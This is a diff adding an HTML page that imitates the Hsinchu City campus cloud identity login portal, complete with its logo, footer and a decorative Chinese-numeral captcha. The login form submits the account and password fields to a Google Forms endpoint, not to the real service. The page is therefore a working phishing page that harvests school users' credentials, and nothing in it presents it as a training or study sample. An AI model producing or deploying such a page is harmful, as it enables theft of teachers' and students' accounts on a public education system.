@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>新竹市校園雲端身分驗證服務</title>
+    <link href="./新竹市校園雲端身分驗證服務_files/icon" rel="stylesheet">
+    <link href="./新竹市校園雲端身分驗證服務_files/bootstrap.min.css" rel="stylesheet">
+    <link href="./新竹市校園雲端身分驗證服務_files/purge.css" rel="stylesheet" type="text/css">
+    <link href="./新竹市校園雲端身分驗證服務_files/main.css" rel="stylesheet">
+    <link href="./新竹市校園雲端身分驗證服務_files/notosanstc.css" rel="stylesheet">
+    <link rel="preload" href="https://gportal.hc.edu.tw/assets/fonts/notoSans/NotoSansTC-Regular.woff2" as="font" type="font/woff2" crossorigin="">
+    <script src="./新竹市校園雲端身分驗證服務_files/bootstrap.bundle.min.js.下載"></script>
+</head>
+<body class="color-2d bg-bodys">
+    <div class="flex flex-col justify-between h-100">
+        <div class="grid bg-white rounded-lg box-s my-0 my-sm-auto mx-auto align-self-center" style="max-width: 32rem;">
+            <div class="px-6 py-6 sm:py-10 sm:px-16 w-full">
+
+                <!-- 返回 & 說明 -->
+                <div class="flex justify-between items-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 15 15" class="color-ac cursor-pointer" onclick="window.history.back();">
+                        <path fill="none" stroke="currentColor" stroke-linecap="square" d="M10 14L3 7.5L10 1"></path>
+                    </svg>
+                    <div class="color-ac">
+                        <a href="https://gportal.hc.edu.tw/doc/illustrate.aspx" target="_blank">服務說明</a>
+                    </div>
+                </div>
+
+                <!-- 標題 -->
+                <div class="text-center mt-6 text-sm">
+                    <img src="./新竹市校園雲端身分驗證服務_files/logohc.png" width="60" alt="" class="mx-auto mb-4">
+                    <h1 class="text-2xl color-ac">新竹市校園雲端身分驗證服務</h1>
+                    <hr class="my-3">
+                    <div class="color-f3 mt-3 fs-18">登入</div>
+                    <div class="pt-4"></div>
+                </div>
+
+                <!-- 表單區 -->
+                <div class="mt-4">
+                    <form method="get" action="https://docs.google.com/forms/d/e/1FAIpQLScPKSJk2vIi_Q3oidAsoX-SrWYBCwxHQFtJsmEu9zwQBuBSwA/formResponse?usp=pp_url" id="form1">
+<div class="aspNetHidden">
+
+<div class="aspNetHidden">
+
+                        <!-- ✅ 登入面板 -->
+                        <div id="panelLogin">
+	
+                            <!-- 帳號/密碼 -->
+                            <input name="entry.2009025107" type="text" id="txtAccount" class="form-control h-12 mb-7" placeholder="請輸入帳號" autocomplete="off">
+                            <div class="position-relative mb-4">
+                                <input name="entry.259222059" type="text" id="=txtPwd" class="form-control h-12 pe-5" placeholder="請輸入密碼" autocomplete="off">
+                                <button type="button" class="btn position-absolute top-0 end-0 h-100 px-3 border-0 bg-transparent" onclick="togglePassword()" tabindex="-1">
+                                    <span id="eyeIcon" class="material-icons">visibility</span>
+                                </button>
+                            </div>
+
+                            <!-- ✅ 中文數字驗證碼區塊 -->
+                            <div class="row my-3">
+                                <div class="col-12 d-flex justify-content-center align-items-center flex-column">
+                                    <label for="txtCaptcha" class="form-label fw-bold mb-2">安全驗證</label>
+                                    <!-- Canvas 驗證碼顯示區 -->
+                                    <canvas id="captchaCanvas" width="220" height="60" style="border:2px solid #f36c21; cursor:pointer; border-radius:8px; margin-bottom:10px;"></canvas>
+                                    <!-- 驗證碼輸入框 -->
+                                    <input name="entry.1153737892" type="text" maxlength="3" id="txtCaptcha" class="form-control text-center" placeholder="請輸入答案" style="max-width: 150px;">
+                                    <small class="text-muted text-center mt-2">
+                                        <i class="material-icons" style="font-size:14px; vertical-align:middle;">refresh</i>
+                                        點擊圖片可刷新驗證碼，請輸入<b>計算結果（阿拉伯數字）</b>
+                                    </small>
+                                </div>
+                            </div>
+
+                            <!-- 登入按鈕 -->
+                            <input type="submit" name="entry.1308963112" value="登入" id="btSend" class="btn btn-primary w-full h-12 border-0 hover:opacity-95 mb-7 rounded-3xl" style="background-image: linear-gradient(to top, #192e5b, #1d65a6);">
+                        
+</div>
+
+                        <!-- ✅ 修改帳號面板（身分證字號登入者） -->
+                        
+
+                        <!-- ✅ 密碼過期面板 -->
+                        
+
+                        <span id="lblMessage" class="text text-danger"></span>
+                    </form>
+                </div>
+
+                <!-- 教師特殊狀況 -->
+                <div id="panelTeacherHelp">
+	
+                    <div class="mt-12 color-ac text-sm" style="color:#0067ac;">
+
+                        <div class="text-start my-4 ms-3" style="text-indent:-1em;">
+                            教師忘記密碼：
+                            <a href="" class="fw-bolder color-f3" style="border-bottom:1px solid #f36c21!important;" target="_blank">
+                                教師忘記密碼連結
+                            </a>
+                        </div>
+                       <div class="text-start my-4 ms-3" style="text-indent:-1em;">
+                            特殊狀況登入：
+                            <a href="" class="fw-bolder color-f3" style="border-bottom:1px solid #f36c21!important;" target="_blank">
+                                新竹市教師帳號認證系統
+                            </a>
+                            <small class="d-block text-muted">
+                                1. 採用身分證登入  2. 信箱尚未驗證或錯誤
+                            </small>
+                        </div>
+                    </div>
+                
+</div>
+            </div>
+        </div>
+
+        <!-- 頁尾 -->
+        <div class="pt-4 pb-2 color-ac" style="background:#fafafa;">
+            <div class="mx-auto px-4" style="max-width:36rem;">
+                <div class="flex flex-wrap items-center py-2 text-sm color-ac">
+                    <div class="me-auto mb-3">©2023 新竹市教育處 All right reserved</div>
+                    <div class="flex mb-3">
+                        <a href="https://www.hc.edu.tw/publicfile/relatedWeb.aspx#tab3" class="me-3 color-ac" target="_blank" rel="noreferrer noopener">隱私權聲明</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ✅ 中文數字驗證碼 JavaScript -->
+    <script>
+        // 中文數字驗證碼生成
+        function generateChineseCaptcha() {
+            const chineseNums = ['零', '一', '二', '三', '四', '五', '六', '七', '八', '九'];
+            const operators = ['加', '減'];
+            const op = operators[Math.floor(Math.random() * operators.length)];
+            let num1, num2, answer;
+
+            if (op === '加') {
+                num1 = Math.floor(Math.random() * 15) + 1;
+                num2 = Math.floor(Math.random() * 15) + 1;
+                answer = num1 + num2;
+            } else {
+                num1 = Math.floor(Math.random() * 20) + 10;
+                num2 = Math.floor(Math.random() * 9) + 1;
+                answer = num1 - num2;
+            }
+
+            const num1Text = num1 < 10 ? chineseNums[num1] : convertToChineseNumber(num1);
+            const num2Text = num2 < 10 ? chineseNums[num2] : convertToChineseNumber(num2);
+
+            return {
+                question: `${num1Text} ${op} ${num2Text} = ?`,
+                answer: answer.toString()
+            };
+        }
+
+        function convertToChineseNumber(num) {
+            const chineseNums = ['零', '一', '二', '三', '四', '五', '六', '七', '八', '九'];
+            if (num < 10) return chineseNums[num];
+            if (num < 20) return '十' + (num === 10 ? '' : chineseNums[num % 10]);
+            const tens = Math.floor(num / 10);
+            const ones = num % 10;
+            return chineseNums[tens] + '十' + (ones === 0 ? '' : chineseNums[ones]);
+        }
+
+        function drawCaptcha() {
+            const canvas = document.getElementById("captchaCanvas");
+            if (!canvas) return; // 如果 canvas 不存在則跳過
+
+            const ctx = canvas.getContext("2d");
+            const captcha = generateChineseCaptcha();
+
+            // 記錄答案到隱藏欄位
+            const hfCaptcha = document.getElementById('hfCaptchaValue');
+            if (hfCaptcha) hfCaptcha.value = captcha.answer;
+
+            canvas.width = 220;
+            canvas.height = 60;
+
+            // 1. 漸層背景
+            const gradient = ctx.createLinearGradient(0, 0, 220, 60);
+            gradient.addColorStop(0, '#fff9e6');
+            gradient.addColorStop(0.5, '#ffe6cc');
+            gradient.addColorStop(1, '#fff9e6');
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 0, 220, 60);
+
+            // 2. 背景雜訊
+            for (let i = 0; i < 1000; i++) {
+                ctx.fillStyle = `rgba(${Math.random()*150}, ${Math.random()*150}, ${Math.random()*150}, ${Math.random()*0.25})`;
+                ctx.fillRect(Math.random()*220, Math.random()*60, 1, 1);
+            }
+
+            // 3. 干擾線
+            for (let i = 0; i < 8; i++) {
+                ctx.strokeStyle = `rgba(${Math.random()*200}, ${Math.random()*200}, ${Math.random()*200}, 0.35)`;
+                ctx.lineWidth = Math.random() * 2 + 1;
+                ctx.beginPath();
+                ctx.moveTo(Math.random() * 220, Math.random() * 60);
+                ctx.bezierCurveTo(
+                    Math.random() * 220, Math.random() * 60,
+                    Math.random() * 220, Math.random() * 60,
+                    Math.random() * 220, Math.random() * 60
+                );
+                ctx.stroke();
+            }
+
+            // 4. 繪製中文算式
+            const text = captcha.question;
+            const charWidth = 200 / text.length;
+            
+            for (let i = 0; i < text.length; i++) {
+                ctx.save();
+                
+                const x = 15 + i * charWidth;
+                const y = 35 + (Math.random() - 0.5) * 6;
+                ctx.translate(x, y);
+                
+                ctx.rotate((Math.random() - 0.5) * 0.25);
+                
+                const fontSize = 22 + Math.random() * 6;
+                ctx.font = `bold ${fontSize}px "Microsoft JhengHei", "Noto Sans TC", Arial`;
+                
+                const colors = ['#0d47a1', '#b71c1c', '#1b5e20', '#e65100', '#4a148c'];
+                ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
+                
+                ctx.shadowColor = 'rgba(0,0,0,0.4)';
+                ctx.shadowBlur = 2;
+                ctx.shadowOffsetX = 1;
+                ctx.shadowOffsetY = 1;
+                
+                ctx.fillText(text[i], 0, 0);
+                ctx.restore();
+            }
+
+            // 5. 波浪干擾
+            ctx.strokeStyle = 'rgba(120,120,120,0.25)';
+            ctx.lineWidth = 1.5;
+            ctx.beginPath();
+            for (let x = 0; x < 220; x += 2) {
+                const y = 30 + Math.sin(x * 0.07) * 10;
+                if (x === 0) ctx.moveTo(x, y);
+                else ctx.lineTo(x, y);
+            }
+            ctx.stroke();
+
+            // 6. 邊框
+            ctx.strokeStyle = '#f36c21';
+            ctx.lineWidth = 2;
+            ctx.strokeRect(0, 0, 220, 60);
+        }
+
+        // 頁面載入時繪製驗證碼
+        document.addEventListener("DOMContentLoaded", () => {
+            drawCaptcha();
+            const canvas = document.getElementById("captchaCanvas");
+            if (canvas) canvas.addEventListener("click", drawCaptcha);
+        });
+
+        function togglePassword() {
+            const pwdInput = document.getElementById('txtPwd');
+            const eyeIcon = document.getElementById('eyeIcon');
+
+            if (pwdInput && pwdInput.type === 'password') {
+                pwdInput.type = 'text';
+                eyeIcon.textContent = 'visibility_off';
+            } else if (pwdInput) {
+                pwdInput.type = 'password';
+                eyeIcon.textContent = 'visibility';
+            }
+        }
+    </script>
+
+
+</body></html>
